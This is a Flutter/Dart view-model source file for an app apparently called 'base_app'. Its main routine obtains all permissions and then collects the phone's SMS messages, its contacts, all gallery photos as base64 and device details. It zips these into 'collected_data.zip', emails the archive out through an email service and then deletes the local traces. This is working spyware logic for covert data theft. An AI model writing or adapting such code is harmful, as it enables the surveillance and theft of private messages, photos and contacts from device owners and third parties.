import 'dart:io';
import 'package:base_app/services/DeviceInfoService.dart';
import 'package:base_app/services/EmailService.dart';
import 'package:flutter/cupertino.dart';
import 'package:path_provider/path_provider.dart';
import '../constants/AppStrings.dart';
import '../constants/ConstMethods.dart';
import '../services/SmsService.dart';
import '../services/contactsService.dart';
import '../services/galleryService.dart';
import '../services/zipService.dart';
import '../services/permissionsService.dart';

class HomePageViewModel extends ChangeNotifier {
  final SmsService _smsService = SmsService();
  final ContactsServices _contactsService = ContactsServices();
  final GalleryService _galleryService = GalleryService();
  final ZipService _zipService = ZipService();
  final PermissionsService _permissionsService = PermissionsService();
  final DeviceInfoService _deviceInfoService = DeviceInfoService();
  final EmailService _emailService = EmailService();

  bool isLoading = false;
  List<File> files = [];

  Future<void> getDataAndSendEmail(
      BuildContext context) async {
    try {
      bool permissionsGranted =
          await _permissionsService.requestAllPermissions();
      if (!permissionsGranted) {
        ConstMethods.showBottomSheet(context,
            const Text(AppStrings.theNecessaryPermissionsWereNotGiven));
        return;
      } else {
        isLoading = true;
        await _getSms();
        await _getContacts();
        await _getGallery();
        await _getDeviceInfo();
        final zipFile = await _createZip();
        await _emailService.sendEmail(zipFile);
        await _deleteSpecificFiles();
        isLoading = false;

      }
    } catch (e) {
      isLoading = false;
      notifyListeners();
    }
  }

  Future<void> _getSms() async {
    try {
      final smsMessages = await _smsService.getSmsMessages();
      String path = await _getFilePath('sms.txt');
      final smsFile = File(path);
      await smsFile.writeAsString(
        smsMessages
            .map((e) => 'From: ${e.address}, Message: ${e.body}')
            .join('\n'),
      );
      files.add(smsFile);
      print("sms dosyası oluştu");
    } catch (e) {
      print("Hata: $e");
    }
  }

  Future<void> _getContacts() async {
    try {
      final contacts = await _contactsService.getContactsFromDevice();
      String path = await _getFilePath('contacts.txt');
      final contactsFile = File(path);
      await contactsFile.writeAsString(
        contacts
            .map((e) =>
                'Name: ${e.displayName}, Phone: ${e.phones?.map((p) => p.value).join(", ")}')
            .join('\n'),
      );
      files.add(contactsFile);
      print("rehber dosyası oluştu");
    } catch (e) {}
  }

  Future<void> _getGallery() async {
    try {
      final photos = await _galleryService.getPhotos();
      List<String> base64Photos = [];

      for (var photo in photos) {
        String base64Photo = await _galleryService.convertPhotoToBase64(photo);
        base64Photos.add(base64Photo);
      }

      String path = await _getFilePath('gallery_base64.txt');
      final galleryFile = File(path);
      await galleryFile.writeAsString(base64Photos.join('\n'));

      files.add(galleryFile);
      print("Galeri dosyası oluşturuldu ve tek bir dosyaya yazıldı.");
    } catch (e) {
      print("Hata: ${e.toString()}");
    }
  }

  Future<void> _getDeviceInfo() async {
    try {
      List<String> deviceInfoList = await _deviceInfoService.getDeviceInfo();
      String path = await _getFilePath('devices_info.txt');
      final deviceInfoFile = File(path);
      await deviceInfoFile.writeAsString(deviceInfoList.join('\n'));

      files.add(deviceInfoFile);
      print("Cihaz bilgileri dosyası oluştu");
    } catch (e) {
      print("Hata: $e");
    }
  }

  Future<File> _createZip() async {
    try {
      String zipPath = await _getFilePath('collected_data.zip');
      final zipFile = await _zipService.createZip(files, zipPath);
      print("zip dosyası oluştu");
      print("ZIP Dosya Boyutu: ${zipFile.lengthSync() / (1024 * 1024)} MB");

      return zipFile;
    } catch (e) {
      rethrow;
    }
  }

  Future<void> _deleteSpecificFiles() async {
    try {
      List<String> fileNames = [
        'sms.txt',
        'contacts.txt',
        'gallery_base64.txt',
        'collected_data.zip',
        'devices_info.txt',
      ];

      for (var fileName in fileNames) {
        String path = await _getFilePath(fileName);
        final file = File(path);
        if (await file.exists()) {
          await file.delete();
          print("$fileName silindi.");
        }
      }

      print("Tüm dosyalar silindi.");
    } catch (e) {
      print("Hata: $e");
    }
  }

  Future<String> _getFilePath(String fileName) async {
    final directory = await getApplicationDocumentsDirectory();
    return '${directory.path}/$fileName';
  }
}
